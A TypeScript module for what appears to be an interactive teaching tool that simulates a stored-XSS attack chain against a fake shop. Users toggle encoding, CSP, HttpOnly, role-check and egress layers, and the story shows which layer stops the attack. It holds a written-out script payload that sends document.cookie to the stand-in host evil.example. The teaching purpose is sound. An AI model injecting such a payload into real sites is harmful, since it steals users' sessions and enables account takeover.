import { readChoice, refusal } from '../../algorithms/form';
import type { Step } from '../../types/visualization';
import { EMPTY } from '../steps';
import { USERS } from '../web/data';
import { createEvil, EVIL_ORIGIN, evilDropped, evilStolen } from '../web/evil';
import { loadPage } from '../web/page';
import { createShop, SAFE_SHOP, SHOP_ORIGIN } from '../web/shop';
import { injectedScripts } from '../web/shop-pages';
import { createStory, resultOf, type Story } from '../web/story';
import { createWorld, type World } from '../web/world';

export const threatModelingCode = `// 1. a stored comment reaches alice's browser
page = comments.map((c) => encode(c.body))
csp = "script-src 'nonce-...'"

// 2. the script sends the cookie out
fetch('https://evil.example/c?' + document.cookie)

// 3. the attacker opens /admin as alice
if (user.role != 'admin') return 403

// 4. the attacker exports the users table
if (!egressAllows(to)) return 403
post(to, users)`;

export const LAYERS = [
  { name: 'encoding', label: 'Output encoding', help: 'The comment stays text.' },
  { name: 'csp', label: 'Content Security Policy', help: 'The injected script is blocked.' },
  { name: 'httpOnly', label: 'HttpOnly cookie', help: 'The script can\'t read the session cookie.' },
  { name: 'roleCheck', label: 'Role check', help: 'A customer\'s session can\'t open /admin.' },
  { name: 'egress', label: 'Egress filter', help: 'The server can\'t post to evil.example.' },
];

export const LAYER_OPTIONS = ['Off', 'On'];

const MALLORY = { name: 'mallory', password: 'stored-xss', role: 'customer' };
const PAYLOAD = "<script>fetch('https://evil.example/c?' + document.cookie)</script>";
const DROP = `${EVIL_ORIGIN}/drop`;

type Plan = { on: Record<string, boolean>; world: World; story: Story };

const attackerAsks = (world: World, method: 'GET' | 'POST', path: string, cookie: string) => world.send({ method, url: `${SHOP_ORIGIN}${path}`, headers: { cookie }, body: {} }, 'attacker');

const labelOf = (name: string) => LAYERS.find((layer) => layer.name === name)!.label;

function stop({ on, story }: Plan, stage: string, layer: string, title: string, why: string, line: string) {
  const later = LAYERS.map(({ name }) => name).slice(LAYERS.findIndex(({ name }) => name === layer) + 1).filter((name) => on[name]);
  const also = later.length > 0 ? ` Behind it, these would also have held: ${later.map(labelOf).join(', ')}.` : ' Nothing behind it was on, so this one layer carried the whole defense.';
  story.step({ title, why: `${why}${also}`, line, variables: { stage, stoppedBy: layer, alsoHeld: later.join(', ') || 'none', result: 'stopped' } });
}

function play(plan: Plan) {
  const { world, story } = plan;
  const run = loadPage(world, `${SHOP_ORIGIN}/comments`);
  story.step({ title: 'alice opens the comments', why: `The shop sends the page${run.response.headers['content-security-policy'] ? ', with a policy in its header' : ', with no policy'}.`, next: 'What does the browser do with the comment?', line: 'page = comments.map', text: { label: 'Page', lines: { Source: run.response.body.split('\n')[0]! } } });
  const script = injectedScripts(run.scripts)[0];
  if (!script) return stop(plan, 'comment', 'encoding', 'The comment stays text', 'Encoding turned the markup into plain characters, so the browser drew it and ran nothing. The attack ends where it started.', 'page = comments.map');
  if (script.status === 'blocked') return stop(plan, 'comment', 'csp', 'The browser blocks the script', `The markup reached the page, but the browser refused it under ${script.rule}.`, 'csp = ');
  story.step({ title: 'The script runs in alice\'s browser', why: 'The page held mallory\'s script, and the browser ran it as the shop\'s own code.', next: 'The script sends document.cookie to evil.example.', line: "fetch('https://evil.example/c?'" });

  const cookie = evilStolen(world)[0] ?? '';
  if (!cookie) return stop(plan, 'cookie', 'httpOnly', 'The script sends empty text', 'The session cookie is HttpOnly, so document.cookie gave nothing, and evil.example learned nothing. The script still ran, but it has no way to hand the session over.', "fetch('https://evil.example/c?'");
  story.step({ title: 'evil.example holds the session', why: `${cookie} arrived at evil.example. The attacker can now send it as alice, with no password.`, next: 'The attacker tries the admin page.', line: "fetch('https://evil.example/c?'" });

  const admin = attackerAsks(world, 'GET', '/admin', cookie);
  if (admin.status !== 200) return stop(plan, 'admin', 'roleCheck', `The attacker opens /admin → ${admin.status}`, 'The stolen session is alice\'s, and alice is a customer. The role check runs on the server, so stealing the session did not steal any more rights.', "if (user.role != 'admin')");
  story.step({ title: `The attacker opens /admin → ${admin.status}`, why: `${admin.body} Nothing checked the role, so a customer's session reaches the admin page.`, next: 'The attacker asks the shop to export its users.', line: "if (user.role != 'admin')" });

  const sent = attackerAsks(world, 'POST', `/admin/export?to=${encodeURIComponent(DROP)}`, cookie);
  if (sent.status !== 200) return stop(plan, 'export', 'egress', `The export → ${sent.status}`, `${sent.body} The server may only post to its own backup host, so the data stays in.`, 'if (!egressAllows(to))');
  const names = evilDropped(world)[0]!.split('\n').map((line) => line.split(':')[0]).join(', ');
  story.step({ title: 'The users table is at evil.example', why: `evil.example now holds the users table, with hashes: ${names}. Five small gaps made one breach, and any single layer would have stopped it here.`, line: 'post(to, users)', variables: { stage: 'out', stoppedBy: 'nothing', alsoHeld: 'none', result: resultOf(true) } });
}

export function threatModelingSteps(values: Record<string, string>): Step[] {
  const on: Record<string, boolean> = {};
  for (const layer of LAYERS) {
    const choice = readChoice(values, layer.name, layer.label, LAYER_OPTIONS);
    if (!choice.ok) return refusal('Cannot run this attack', choice.why, EMPTY);
    on[layer.name] = choice.value === 'On';
  }

  const shop = createShop({
    users: [...SAFE_SHOP.users, MALLORY],
    encode: on.encoding!,
    csp: on.csp ? 'nonce' : 'none',
    cookie: { ...SAFE_SHOP.cookie, httpOnly: on.httpOnly! },
    access: { ...SAFE_SHOP.access, roleCheck: on.roleCheck! },
    egress: on.egress!,
  });
  const world = createWorld([shop, createEvil()]);
  const story = createStory({ world, code: threatModelingCode, nodes: ['browser', 'attacker', 'shop', 'evil'] });
  const alice = USERS[0];

  world.browser.submit(`${SHOP_ORIGIN}/signin`, { name: alice.name, password: alice.password });
  const signIn = world.send({ method: 'POST', url: `${SHOP_ORIGIN}/signin`, headers: {}, body: { name: MALLORY.name, password: MALLORY.password } }, 'attacker');
  world.send({ method: 'POST', url: `${SHOP_ORIGIN}/comments`, headers: { cookie: `sid=${signIn.setCookies[0]!.value}` }, body: { body: PAYLOAD } }, 'attacker');
  story.step({ title: 'mallory posts a comment', why: `One attack, end to end. It needs each step to work. Layers on: ${LAYERS.filter(({ name }) => on[name]).map(({ label }) => label).join(', ') || 'none'}.`, next: 'alice, a signed-in customer, opens the comments.', line: 'page = comments.map', text: { label: 'Comment', lines: { Body: PAYLOAD } } });

  play({ on, world, story });
  return story.steps;
}
